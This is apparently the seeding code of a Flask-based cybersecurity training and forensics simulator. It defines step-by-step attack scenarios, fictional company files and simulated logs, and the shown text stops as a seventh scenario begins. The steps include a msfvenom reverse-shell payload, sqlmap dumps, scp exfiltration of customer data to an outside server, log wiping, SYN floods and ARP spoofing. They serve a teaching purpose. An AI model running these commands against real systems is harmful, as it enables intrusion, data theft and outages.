from flask import Flask, render_template, jsonify, request
from flask_cors import CORS
import sqlite3
import json
from datetime import datetime, timedelta
import os

app = Flask(__name__)
CORS(app)

# Database setup
DATABASE = 'forensics.db'

def get_db():
    db = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db

def init_db():
    """Initialize database with attack scenarios and logs"""
    if os.path.exists(DATABASE):
        os.remove(DATABASE)
    
    db = get_db()
    cursor = db.cursor()
    
    # Create tables
    cursor.execute('''CREATE TABLE scenarios (
        id INTEGER PRIMARY KEY,
        name TEXT NOT NULL,
        description TEXT,
        attack_type TEXT,
        difficulty TEXT,
        tryhackme_rooms TEXT,
        forensics_rooms TEXT,
        guide TEXT
    )''')
    
    cursor.execute('''CREATE TABLE attack_steps (
        id INTEGER PRIMARY KEY,
        scenario_id INTEGER,
        step_number INTEGER,
        title TEXT,
        description TEXT,
        action TEXT,
        command TEXT,
        command_hint TEXT,
        log_entry TEXT,
        FOREIGN KEY (scenario_id) REFERENCES scenarios(id)
    )''')
    
    cursor.execute('''CREATE TABLE generated_logs (
        id INTEGER PRIMARY KEY,
        scenario_id INTEGER,
        session_id TEXT,
        log_type TEXT,
        timestamp TEXT,
        content TEXT,
        is_evidence INTEGER DEFAULT 0,
        FOREIGN KEY (scenario_id) REFERENCES scenarios(id)
    )''')
    
    cursor.execute('''CREATE TABLE sessions (
        id INTEGER PRIMARY KEY,
        session_id TEXT UNIQUE,
        scenario_id INTEGER,
        mode TEXT,
        created_at TEXT,
        completed_steps TEXT,
        FOREIGN KEY (scenario_id) REFERENCES scenarios(id)
    )''')

    cursor.execute('''CREATE TABLE company_files (
        id INTEGER PRIMARY KEY,
        scenario_id INTEGER,
        company_name TEXT,
        filename TEXT,
        filepath TEXT,
        content TEXT,
        file_type TEXT,
        FOREIGN KEY (scenario_id) REFERENCES scenarios(id)
    )''')

    cursor.execute('''CREATE TABLE user_profiles (
        id INTEGER PRIMARY KEY,
        username TEXT UNIQUE NOT NULL,
        xp INTEGER DEFAULT 0,
        level INTEGER DEFAULT 1,
        completed_scenarios TEXT DEFAULT '[]',
        created_at TEXT
    )''')

    cursor.execute('''CREATE TABLE achievements (
        id INTEGER PRIMARY KEY,
        user_id INTEGER,
        achievement_key TEXT,
        unlocked_at TEXT,
        FOREIGN KEY (user_id) REFERENCES user_profiles(id)
    )''')

    cursor.execute('''CREATE TABLE teams (
        id INTEGER PRIMARY KEY,
        team_name TEXT UNIQUE NOT NULL,
        members TEXT DEFAULT '[]',
        total_score INTEGER DEFAULT 0,
        created_at TEXT
    )''')

    cursor.execute('''CREATE TABLE luca (
        id INTEGER PRIMARY KEY,
        term TEXT NOT NULL,
        category TEXT,
        definition TEXT,
        example TEXT
    )''')
    
    # ==========================================
    # SCENARIO 1: Phishing & Credential Theft
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms, guide)
    VALUES (?, ?, ?, ?, ?, ?, ?)''', 
    ('Phishing & Credential Theft', 
     'A user receives a malicious email and enters credentials on a fake login page',
     'Phishing',
     'Beginner',
     'Phishing|https://tryhackme.com/room/phishingyl;Intro to Social Engineering|https://tryhackme.com/room/introtosocialengineering;Nmap|https://tryhackme.com/room/nmap01',
     'Intro to Digital Forensics|https://tryhackme.com/room/introdigitalforensics;Email Analysis|https://tryhackme.com/room/youremailedphishing;Phishing Analysis|https://tryhackme.com/room/phishingemails2rytmuv',
     '<h4>Objective</h4><p>Execute a complete phishing attack chain from reconnaissance to lateral movement. You are targeting company.com employees.</p><h4>What You Will Learn</h4><ul><li>Network scanning with <code>nmap</code></li><li>Social engineering email crafting with <code>setoolkit</code></li><li>Website cloning with <code>httrack</code></li><li>Credential harvesting techniques</li></ul><h4>How to Clear</h4><ul><li>Step 1: Scan the target — use any nmap scan (e.g., <code>nmap -sV</code>)</li><li>Step 2: Craft phishing email — use <code>setoolkit</code> with phishing template</li><li>Step 3: Clone the login page — use <code>httrack</code> to clone the URL</li><li>Step 4: Send the email — use <code>sendmail</code> with spoofed address</li><li>Step 5: Capture credentials — start a listener with <code>harvest</code></li><li>Step 6: Move laterally — SSH into the target</li></ul><h4>Real-World Context</h4><p>The 2020 Twitter hack used social engineering to gain internal access. Phishing remains the #1 initial access vector in 91% of cyber attacks.</p>'))
    
    phishing_steps = [
        (1, 1, 'Attacker Reconnaissance', 'Profile the target company and identify email targets', 'gather_info',
         'nmap -sV company.com', 'Try scanning the target domain with nmap',
         'Attacker identified domain: company.com | Target email: user@company.com'),
        (1, 2, 'Email Crafting', 'Create a convincing phishing email with urgent tone', 'craft_email',
         'setoolkit --phish --template urgent_password', 'Use the social engineering toolkit to craft a phish',
         'Email crafted: Subject "URGENT: Update Your Password" | From: admin@compny.com'),
        (1, 3, 'Fake Login Portal', 'Host fake login page on attacker domain', 'deploy_portal',
         'httrack --clone https://company.com/login', 'Clone the login page using httrack',
         'Phishing portal deployed: http://secure-login.fake-domain.com/login'),
        (1, 4, 'Email Delivery', 'Send phishing email to target', 'send_email',
         'sendmail --to user@company.com --spoof admin@compny.com', 'Send the crafted email with a spoofed sender',
         '2024-01-15 10:23:45 | Email sent to user@company.com | Subject: URGENT: Update Your Password'),
        (1, 5, 'Credential Capture', 'User enters credentials on fake site', 'capture_creds',
         'harvest --listen 443 --capture credentials', 'Start the credential harvester listener',
         '2024-01-15 10:25:12 | User clicked phishing link | User entered credentials | username: user@company.com'),
        (1, 6, 'Lateral Movement', 'Use stolen credentials to access real systems', 'lateral_move',
         'ssh user@company.com -i stolen_creds', 'SSH into the target using stolen credentials',
         '2024-01-15 10:26:30 | SSH login attempt from 192.168.1.100 | Authentication successful'),
    ]
    
    for step in phishing_steps:
        cursor.execute('''INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''', step)
    
    # ==========================================
    # SCENARIO 2: SQL Injection Attack
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('SQL Injection Attack',
     'Exploit a vulnerable web application to extract sensitive data from the database',
     'SQL Injection',
     'Beginner',
     'SQL Injection|https://tryhackme.com/room/sqlilab;OWASP Top 10|https://tryhackme.com/room/owasptop10;SQL Injection Lab|https://tryhackme.com/room/dvwa',
     'Web App Forensics|https://tryhackme.com/room/dvwa;Log Analysis|https://tryhackme.com/room/introtologs;Investigating with Splunk|https://tryhackme.com/room/introtosplunk'))
    
    sqli_steps = [
        (2, 1, 'Target Reconnaissance', 'Scan the target web application for entry points', 'scan_target',
         'dirb http://target.com /usr/share/wordlists', 'Use dirb to discover web directories',
         'Discovered endpoints: /login, /search, /profile, /admin | Server: Apache/2.4.41'),
        (2, 2, 'Identify Injection Point', 'Test input fields for SQL injection vulnerability', 'test_sqli',
         "sqlmap -u http://target.com/search?q=test --dbs", 'Use sqlmap to test for SQL injection',
         "Parameter 'q' is vulnerable | Type: UNION-based | Backend DBMS: MySQL 8.0"),
        (2, 3, 'Extract Database Schema', 'Enumerate database tables and columns', 'enum_db',
         'sqlmap -u http://target.com/search?q=test --tables', 'Enumerate the database tables with sqlmap',
         'Database: webapp_db | Tables: users, payments, sessions, admin_config'),
        (2, 4, 'Dump User Credentials', 'Extract username and password data from users table', 'dump_creds',
         'sqlmap -u http://target.com/search?q=test -T users --dump', 'Dump the users table contents',
         'Extracted 847 rows from users table | Columns: id, username, email, password_hash, role'),
        (2, 5, 'Privilege Escalation', 'Crack admin password hash and gain admin access', 'crack_hash',
         'hashcat -m 0 admin_hash.txt rockyou.txt', 'Use hashcat to crack the password hashes',
         'Hash cracked: admin@target.com | password: Str0ngP@ss! | Role: administrator'),
        (2, 6, 'Data Exfiltration', 'Access admin panel and exfiltrate sensitive data', 'exfiltrate',
         'curl -b admin_cookie http://target.com/admin/export?table=payments', 'Use the admin session to export payment data',
         'Exported 2,341 payment records | Contains: card numbers, CVVs, billing addresses'),
    ]
    
    for step in sqli_steps:
        cursor.execute('''INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''', step)

    # ==========================================
    # SCENARIO 3: Malware & Ransomware
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Malware & Ransomware',
     'Develop and deploy ransomware to encrypt files and demand payment',
     'Ransomware',
     'Intermediate',
     'MAL: Malware Introductory|https://tryhackme.com/room/malmalintroductory;Metasploit Introduction|https://tryhackme.com/room/metasploitintro;History of Malware|https://tryhackme.com/room/historyofmalware',
     'Volatility|https://tryhackme.com/room/volatility;REMnux|https://tryhackme.com/room/yourfirstmalwareanalysis;YARA|https://tryhackme.com/room/yara'))

    malware_steps = [
        (3, 1, 'Payload Development', 'Create a malware payload with encryption capabilities', 'create_payload',
         'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 -f exe', 'Use msfvenom to generate a reverse shell payload',
         'Payload generated: update_patch.exe | Size: 73802 bytes | Type: reverse_tcp meterpreter'),
        (3, 2, 'Delivery via Exploit Kit', 'Host malware on compromised website for drive-by download', 'deliver_payload',
         'beef-xss --hook http://compromised-site.com --payload update_patch.exe', 'Use BeEF to inject the payload into a compromised site',
         'Exploit kit deployed on compromised-site.com | Waiting for victim to visit'),
        (3, 3, 'Payload Execution', 'Victim downloads and runs the malware', 'execute_payload',
         'msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; run"', 'Start the metasploit handler to catch the reverse connection',
         'Meterpreter session 1 opened | Target: 192.168.1.50 (DESKTOP-VICTIM) | OS: Windows 10'),
        (3, 4, 'Persistence & Spread', 'Install persistence mechanism and spread across network', 'persist',
         'meterpreter> run persistence -U -i 30 -p 4444', 'Setup persistence in the meterpreter session',
         'Persistence installed via registry | Spreading to \\\\192.168.1.51, \\\\192.168.1.52 via SMB'),
        (3, 5, 'File Encryption', 'Encrypt all user files with AES-256', 'encrypt_files',
         'ransomware --encrypt --key AES256 --target C:\\Users', 'Run the ransomware encryption module',
         'Encrypting files... 14,832 files encrypted | Extensions: .docx, .xlsx, .pdf, .jpg, .sql'),
        (3, 6, 'Ransom Demand', 'Display ransom note and demand cryptocurrency payment', 'ransom_note',
         'ransomware --display-note --btc-wallet 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa', 'Deploy the ransom note with payment instructions',
         'Ransom note displayed: "Your files are encrypted. Pay 2 BTC to unlock." | Deadline: 72 hours'),
    ]
    
    for step in malware_steps:
        cursor.execute('''INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''', step)

    # ==========================================
    # SCENARIO 4: Insider Threat
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Insider Threat & Data Theft',
     'A disgruntled employee abuses legitimate access to steal and sell company data',
     'Insider Threat',
     'Advanced',
     'Linux PrivEsc|https://tryhackme.com/room/linprivesc;Intro to Digital Forensics|https://tryhackme.com/room/introdigitalforensics;Incident Response|https://tryhackme.com/room/introtoir',
     'Incident Response|https://tryhackme.com/room/introtoir;Disk Forensics|https://tryhackme.com/room/dvwa;Windows Forensics|https://tryhackme.com/room/introtoir'))

    insider_steps = [
        (4, 1, 'Access Abuse', 'Use legitimate credentials to access restricted databases', 'access_db',
         'psql -h db-server -U john.doe -d customer_data', 'Connect to the restricted database with your credentials',
         'Login successful: john.doe@internal | Accessed: customer_data DB | 2024-03-10 22:15:00 (after hours)'),
        (4, 2, 'Data Staging', 'Copy sensitive data to a staging location', 'stage_data',
         'pg_dump customer_data -t credit_cards -t ssn_records > /tmp/.cache_data', 'Dump sensitive tables to a hidden file',
         'Exported 45,000 customer records to /tmp/.cache_data | Includes: SSN, credit cards, addresses'),
        (4, 3, 'Data Exfiltration', 'Transfer staged data to external storage', 'exfiltrate',
         'scp /tmp/.cache_data john@personal-server.com:/data/', 'SCP the staged data to your personal server',
         'SCP transfer: 128MB to personal-server.com | Duration: 45s | Used corporate VPN'),
        (4, 4, 'Cover Tracks', 'Delete staging files and clear logs to hide evidence', 'cover_tracks',
         'shred -vfz -n 5 /tmp/.cache_data && history -c', 'Securely delete the staging file and clear shell history',
         'File shredded: /tmp/.cache_data | Bash history cleared | Last login timestamp modified'),
        (4, 5, 'Data Sale', 'List stolen data on dark web marketplace', 'sell_data',
         'tor-browser --upload marketplace.onion --listing "45K customer records"', 'Upload the stolen data to a dark web marketplace',
         'Listing created on dark web | Price: $50,000 | Contains: 45K customer records with PII'),
        (4, 6, 'Detection Evasion', 'Continue normal work routine to avoid suspicion', 'evade_detection',
         'vpn --reconnect corporate && login workstation --normal-hours', 'Reconnect to corporate VPN and log in during normal hours',
         'Normal login: 2024-03-11 09:00 | No anomalies in scheduled access pattern | DLP alert suppressed'),
    ]
    
    for step in insider_steps:
        cursor.execute('''INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''', step)

    # ==========================================
    # FAKE COMPANY FILES
    # ==========================================

    # Scenario 1: NexGen Solutions (Phishing target)
    s1_files = [
        (1, 'NexGen Solutions', 'employees.csv', '/nexgen/hr/employees.csv', 'text',
'''employee_id,name,email,department,role
1001,Sarah Chen,s.chen@nexgen-solutions.com,Engineering,Lead Developer
1002,James Wilson,j.wilson@nexgen-solutions.com,Finance,CFO
1003,Priya Patel,p.patel@nexgen-solutions.com,HR,Director
1004,Mike Torres,m.torres@nexgen-solutions.com,IT,Sysadmin
1005,Lisa Wang,l.wang@nexgen-solutions.com,Marketing,VP Marketing
1006,Ahmed Hassan,a.hassan@nexgen-solutions.com,Engineering,Backend Dev
1007,Rachel Kim,r.kim@nexgen-solutions.com,Sales,Account Manager
1008,David Okonkwo,d.okonkwo@nexgen-solutions.com,IT,Network Admin'''),
        (1, 'NexGen Solutions', 'network_config.txt', '/nexgen/it/network_config.txt', 'text',
'''=== NexGen Solutions - Network Configuration ===
Domain: nexgen-solutions.com
Mail Server: mail.nexgen-solutions.com (Exchange 2019)
VPN Gateway: vpn.nexgen-solutions.com
Internal DNS: 10.0.1.5, 10.0.1.6
Web Portal: https://portal.nexgen-solutions.com/login
SSH Jump Host: 10.0.1.20 (jump.nexgen-solutions.com)
Firewall: Palo Alto PA-3260
Wireless SSID: NexGen-Corp / NexGen-Guest
DHCP Range: 10.0.10.0/24 - 10.0.50.0/24'''),
        (1, 'NexGen Solutions', 'email_policy.txt', '/nexgen/policies/email_policy.txt', 'text',
'''=== NexGen Solutions - Email Security Policy ===
Last Updated: 2024-01-02

1. All emails from external senders are tagged [EXTERNAL].
2. Password reset requests must go through IT helpdesk.
3. Suspicious emails should be reported to security@nexgen-solutions.com.
4. Admin portal: https://nexgen-solutions.com/login
5. MFA is required for all admin and finance accounts.
6. Email retention: 90 days for general, 7 years for finance.

NOTE: Recent phishing attempts targeting finance dept observed.
Contact: Mike Torres (m.torres@nexgen-solutions.com) for concerns.'''),
        (1, 'NexGen Solutions', 'server_inventory.txt', '/nexgen/it/server_inventory.txt', 'text',
'''=== NexGen Solutions - Server Inventory ===
Hostname            IP             OS                  Service
---------------------------------------------------------------------------
nxg-web-01          10.0.1.10      Ubuntu 22.04        Web Portal (Nginx)
nxg-mail-01         10.0.1.15      Windows 2019        Exchange Mail Server
nxg-db-01           10.0.1.30      Ubuntu 22.04        PostgreSQL 15
nxg-file-01         10.0.1.35      Windows 2019        File Server (SMB)
nxg-jump-01         10.0.1.20      Ubuntu 22.04        SSH Jump Host
nxg-vpn-01          10.0.1.40      pfSense             VPN Gateway
nxg-dc-01           10.0.1.5       Windows 2022        Domain Controller''')
    ]
    for f in s1_files:
        cursor.execute('INSERT INTO company_files (scenario_id, company_name, filename, filepath, file_type, content) VALUES (?,?,?,?,?,?)',
            (f[0], f[1], f[2], f[3], f[4], f[5]))

    # Scenario 2: ShopEasy Inc (SQL Injection target)
    s2_files = [
        (2, 'ShopEasy Inc', 'webapp_architecture.txt', '/shopeasy/dev/webapp_architecture.txt', 'text',
'''=== ShopEasy Inc - Web Application Architecture ===
Stack: PHP 8.1 / Apache 2.4.41 / MySQL 8.0
Framework: Custom MVC (no ORM - raw SQL queries)
Frontend: jQuery 3.6 + Bootstrap 5

Endpoints:
  /login          - User authentication
  /search         - Product search (GET param: q)
  /profile        - User profile management
  /admin          - Admin panel (role-based access)
  /api/products   - Product API
  /admin/export   - Data export (admin only)

Known Issues:
  - Search endpoint uses string concatenation for SQL (TODO: parameterize)
  - Admin export has no rate limiting
  - Error messages expose stack traces in debug mode'''),
        (2, 'ShopEasy Inc', 'database_schema.sql', '/shopeasy/dev/database_schema.sql', 'text',
'''-- ShopEasy Inc Database Schema (MySQL 8.0)
-- Database: webapp_db

CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) NOT NULL,
    email VARCHAR(100) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,  -- MD5 (legacy, migration pending)
    role ENUM("user", "admin", "moderator") DEFAULT "user",
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE payments (
    id INT PRIMARY KEY AUTO_INCREMENT,
    user_id INT REFERENCES users(id),
    card_number VARCHAR(16),   -- WARNING: stored in plaintext
    cvv VARCHAR(4),
    billing_address TEXT,
    amount DECIMAL(10,2),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE sessions (
    id INT PRIMARY KEY AUTO_INCREMENT,
    user_id INT REFERENCES users(id),
    session_token VARCHAR(255),
    expires_at TIMESTAMP
);

CREATE TABLE admin_config (
    key_name VARCHAR(50) PRIMARY KEY,
    value TEXT
);'''),
        (2, 'ShopEasy Inc', 'api_endpoints.txt', '/shopeasy/dev/api_endpoints.txt', 'text',
'''=== ShopEasy API Endpoints ===
Base URL: http://shopeasy-store.com

GET  /search?q=<query>         Public product search
POST /login                    Authenticate user
GET  /profile                  View user profile (auth required)
GET  /admin                    Admin dashboard (admin role)
GET  /admin/export?table=<t>   Export table data (admin role)
POST /api/products             Create product (admin role)
GET  /api/products/<id>        Get product details

Authentication: Session-based cookies
Admin accounts: admin@shopeasy-store.com (superadmin)

Rate Limiting: None currently implemented
WAF: None - direct Apache exposure'''),
        (2, 'ShopEasy Inc', 'server_info.txt', '/shopeasy/dev/server_info.txt', 'text',
'''=== ShopEasy Production Server ===
Hostname: shopeasy-prod-01
IP: 203.0.113.100
OS: Ubuntu 20.04 LTS
Web Server: Apache 2.4.41
PHP: 8.1.2 (mod_php)
Database: MySQL 8.0.32 (localhost:3306)
SSL: Let\\'s Encrypt (auto-renewal)

Open Ports: 22 (SSH), 80 (HTTP), 443 (HTTPS), 3306 (MySQL - internal only)
Backup: Daily at 02:00 UTC to S3
Last patched: 2024-01-10
Admin URL: http://shopeasy-store.com/admin''')
    ]
    for f in s2_files:
        cursor.execute('INSERT INTO company_files (scenario_id, company_name, filename, filepath, file_type, content) VALUES (?,?,?,?,?,?)',
            (f[0], f[1], f[2], f[3], f[4], f[5]))

    # Scenario 3: MediCore Health (Malware target)
    s3_files = [
        (3, 'MediCore Health', 'network_topology.txt', '/medicore/it/network_topology.txt', 'text',
'''=== MediCore Health - Network Topology ===
Headquarters: 192.168.1.0/24
Branch Office: 192.168.2.0/24
VPN Tunnel: Site-to-Site IPSec

Segments:
  192.168.1.0/26   - Workstations (VLAN 10)
  192.168.1.64/26  - Servers (VLAN 20)
  192.168.1.128/26 - Medical Devices (VLAN 30)
  192.168.1.192/26 - Guest WiFi (VLAN 40)

Firewall: Fortinet FortiGate 100F
IDS/IPS: Snort 3.0 (signatures updated weekly)
Endpoint AV: Windows Defender (basic license)
EDR: None (budget pending Q3 2024)'''),
        (3, 'MediCore Health', 'workstation_inventory.csv', '/medicore/it/workstation_inventory.csv', 'text',
'''hostname,ip,os,user,department,last_patch
DESKTOP-RECV-01,192.168.1.10,Windows 10 Pro,jsmith,Reception,2024-03-28
DESKTOP-NURSE-01,192.168.1.11,Windows 10 Pro,mgarcia,Nursing,2024-03-15
DESKTOP-DOC-01,192.168.1.12,Windows 10 Pro,dlee,Physicians,2024-02-20
DESKTOP-ADMIN-01,192.168.1.15,Windows 10 Pro,kbrown,Admin,2024-03-30
DESKTOP-LAB-01,192.168.1.20,Windows 10 Pro,tchen,Laboratory,2024-01-10
DESKTOP-FIN-01,192.168.1.25,Windows 10 Pro,rjones,Finance,2024-03-25
SERVER-DC-01,192.168.1.50,Windows Server 2019,—,IT,2024-03-30
SERVER-FILE-01,192.168.1.51,Windows Server 2019,—,IT,2024-03-20
SERVER-APP-01,192.168.1.52,Windows Server 2019,—,IT,2024-03-22'''),
        (3, 'MediCore Health', 'software_list.txt', '/medicore/it/software_list.txt', 'text',
'''=== MediCore Health - Approved Software ===
Browser:     Google Chrome 122 (auto-update ON)
Office:      Microsoft 365 (E3 license)
EMR:         MediCore PatientPro v4.2
Email:       Outlook via Microsoft 365
AV:          Windows Defender (basic)
VPN Client:  FortiClient 7.0
Remote:      AnyDesk 8.0 (IT support only)

=== Unapproved / Flagged ===
- USB auto-run: ENABLED (policy override pending)
- Macro execution: ENABLED for .docx/.xlsx
- PowerShell: Unrestricted execution policy
- SMBv1: Still enabled on file server (legacy app dependency)'''),
        (3, 'MediCore Health', 'vpn_config.txt', '/medicore/it/vpn_config.txt', 'text',
'''=== MediCore Health - VPN Configuration ===
VPN Type: SSL VPN (FortiClient)
Gateway: vpn.medicore-health.com
Port: 443
Auth: LDAP (Active Directory)
MFA: Disabled (rollout planned Q2 2024)

Split Tunnel: Enabled
Allowed Subnets: 192.168.1.0/24, 192.168.2.0/24
DNS: 192.168.1.50 (internal DC)

Connected Users (last 24hr):
  jsmith    - 192.168.1.10 - 08:30-17:00
  mgarcia   - 192.168.1.11 - 07:00-15:30
  dlee      - 192.168.1.12 - 09:00-18:00
  rjones    - Remote (home) - 22:00-02:30 <- UNUSUAL''')
    ]
    for f in s3_files:
        cursor.execute('INSERT INTO company_files (scenario_id, company_name, filename, filepath, file_type, content) VALUES (?,?,?,?,?,?)',
            (f[0], f[1], f[2], f[3], f[4], f[5]))

    # Scenario 4: FinVault Corp (Insider Threat target)
    s4_files = [
        (4, 'FinVault Corp', 'employee_directory.csv', '/finvault/hr/employee_directory.csv', 'text',
'''emp_id,name,email,department,clearance,hire_date
FV-1001,John Doe,john.doe@finvault.com,Database Admin,Level 3 (Restricted),2019-06-15
FV-1002,Amanda Liu,amanda.liu@finvault.com,Security,Level 4 (Top Secret),2018-01-20
FV-1003,Robert Nash,robert.nash@finvault.com,Engineering,Level 2 (Confidential),2021-03-10
FV-1004,Sarah Patel,sarah.patel@finvault.com,Finance,Level 3 (Restricted),2020-09-01
FV-1005,Kevin O\\'Brien,kevin.obrien@finvault.com,Compliance,Level 4 (Top Secret),2017-11-30
FV-1006,Maria Santos,maria.santos@finvault.com,Customer Support,Level 1 (Public),2022-07-15
FV-1007,David Chen,david.chen@finvault.com,IT Operations,Level 3 (Restricted),2020-02-28

NOTE: John Doe (FV-1001) has submitted resignation effective 2024-03-31.
Performance review: "Dissatisfied with recent promotion decisions."'''),
        (4, 'FinVault Corp', 'database_access_policy.txt', '/finvault/policies/database_access_policy.txt', 'text',
'''=== FinVault Corp - Database Access Policy ===
Effective: 2024-01-01 | Classification: INTERNAL

1. Production DB access requires Level 3+ clearance.
2. All queries logged in audit_trail table.
3. Bulk exports (>1000 rows) trigger DLP alert.
4. Access hours: 08:00 - 18:00 (Mon-Fri).
5. After-hours access requires manager approval ticket.
6. Personal devices may NOT connect to DB servers.
7. Data must not be copied to /tmp or personal storage.

Databases:
  customer_data    - PII, credit cards, SSNs (Level 3+)
  transactions     - Payment history (Level 2+)
  internal_ops     - Internal tools (Level 1+)

DB Server: db-server.finvault-internal.com
Port: 5432 (PostgreSQL 15)
Admin: amanda.liu@finvault.com (DBA lead)'''),
        (4, 'FinVault Corp', 'data_classification.txt', '/finvault/policies/data_classification.txt', 'text',
'''=== FinVault Corp - Data Classification Guide ===

Level 4 (Top Secret)
  - Encryption keys, security audit reports
  - Access: CISO + Security team only

Level 3 (Restricted)
  - Customer PII: SSNs, credit card numbers, addresses
  - Database: customer_data (tables: credit_cards, ssn_records)
  - 45,000+ customer records
  - Access: DB Admins + authorized analysts

Level 2 (Confidential)
  - Transaction history, internal reports
  - Access: Finance + Engineering

Level 1 (Public)
  - Marketing materials, public docs
  - Access: All employees

Breach notification: Within 72 hours per regulation.
Data at rest: AES-256 encryption.
Data in transit: TLS 1.3 mandatory.'''),
        (4, 'FinVault Corp', 'vpn_logs_sample.txt', '/finvault/it/vpn_logs_sample.txt', 'text',
'''=== FinVault Corp - VPN Access Logs (Last 7 Days) ===
Timestamp             User           Source IP        Duration
------------------------------------------------------------------------
2024-03-04 08:55      amanda.liu     72.14.201.50     8h 05m
2024-03-04 09:02      robert.nash    98.45.32.100     7h 58m
2024-03-04 09:10      john.doe       104.28.15.77     8h 50m
2024-03-05 08:45      amanda.liu     72.14.201.50     9h 15m
2024-03-05 09:00      sarah.patel    68.90.112.30     8h 00m
2024-03-05 22:10      john.doe       185.220.101.5    3h 45m  <- AFTER HOURS
2024-03-06 09:05      john.doe       104.28.15.77     8h 30m
2024-03-07 08:50      amanda.liu     72.14.201.50     8h 10m
2024-03-08 21:30      john.doe       185.220.101.5    4h 20m  <- AFTER HOURS
2024-03-09 09:00      john.doe       104.28.15.77     8h 00m
2024-03-10 22:15      john.doe       185.220.101.5    5h 30m  <- AFTER HOURS

ALERT: john.doe has 3 after-hours VPN sessions from unusual IP.''')
    ]
    for f in s4_files:
        cursor.execute('INSERT INTO company_files (scenario_id, company_name, filename, filepath, file_type, content) VALUES (?,?,?,?,?,?)',
            (f[0], f[1], f[2], f[3], f[4], f[5]))

    # ==========================================
    # SCENARIO 5: DDoS Attack
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('DDoS Attack', 'Launch a distributed denial-of-service attack to overwhelm target servers', 'DDoS', 'Intermediate',
     'Nmap|https://tryhackme.com/room/nmap01;Wireshark|https://tryhackme.com/room/wireshark',
     'Wireshark|https://tryhackme.com/room/wireshark;Snort|https://tryhackme.com/room/snort'))
    for s in [(5,1,'Target Recon','Scan target infrastructure','recon','nmap -sS -p 80,443 target-server.com','Use nmap SYN scan','Target: target-server.com | Ports: 80,443 | No DDoS protection'),
              (5,2,'Botnet Assembly','Activate botnet nodes','assemble_botnet','botnet --activate --nodes 5000 --region global','Activate botnet','Botnet: 5,000 nodes across 12 countries'),
              (5,3,'SYN Flood','Exhaust server connections','syn_flood','hping3 -S --flood -p 80 target-server.com','Use hping3 SYN flood','SYN flood: 500K pps | CPU: 95%'),
              (5,4,'HTTP Flood','Overwhelm application layer','http_flood','slowloris -t target-server.com -p 80 -s 10000','Launch slowloris','HTTP flood: 10K connections | Timeout'),
              (5,5,'DNS Amplification','Amplify via open resolvers','dns_amp','dnsamplify --resolvers list.txt --target target-server.com','DNS amplification','Amplification: 50x | 40Gbps'),
              (5,6,'Sustained Attack','Rotate attack vectors','sustain','ddos-manager --rotate-vectors --duration 4h --target target-server.com','Manage DDoS','Downtime: 3h 47m | Loss: $2.1M')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # SCENARIO 6: Man-in-the-Middle
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Man-in-the-Middle', 'Intercept traffic using ARP spoofing and SSL stripping', 'MITM', 'Intermediate',
     'Wireshark|https://tryhackme.com/room/wireshark;Network Services|https://tryhackme.com/room/networkservices',
     'Wireshark|https://tryhackme.com/room/wireshark;Network Forensics|https://tryhackme.com/room/introtologs'))
    for s in [(6,1,'Network Discovery','Scan local network','net_scan','arp-scan --localnet --interface eth0','Scan with arp-scan','15 hosts | Gateway: 192.168.1.1 | Target: .25'),
              (6,2,'ARP Spoofing','Poison ARP cache','arp_spoof','arpspoof -i eth0 -t 192.168.1.25 192.168.1.1','Use arpspoof','ARP spoofing active | Impersonating gateway'),
              (6,3,'Traffic Capture','Capture all traffic','capture','tcpdump -i eth0 -w captured.pcap host 192.168.1.25','Use tcpdump','2,847 packets | HTTP, DNS, SMTP'),
              (6,4,'SSL Stripping','Downgrade HTTPS','ssl_strip','sslstrip -l 8080 --all','Use sslstrip','3 HTTPS connections downgraded'),
              (6,5,'Credential Sniffing','Extract credentials','sniff_creds','ettercap -T -q -M arp:remote /192.168.1.25// /192.168.1.1//','Use ettercap','Creds: admin@corp.com / Welcome123!'),
              (6,6,'Session Hijacking','Steal session tokens','hijack','ferret -i eth0 && hamster','Use ferret+hamster','Session stolen: SESSIONID=a8f3b2c1d4')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # SCENARIO 7: DNS Poisoning
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
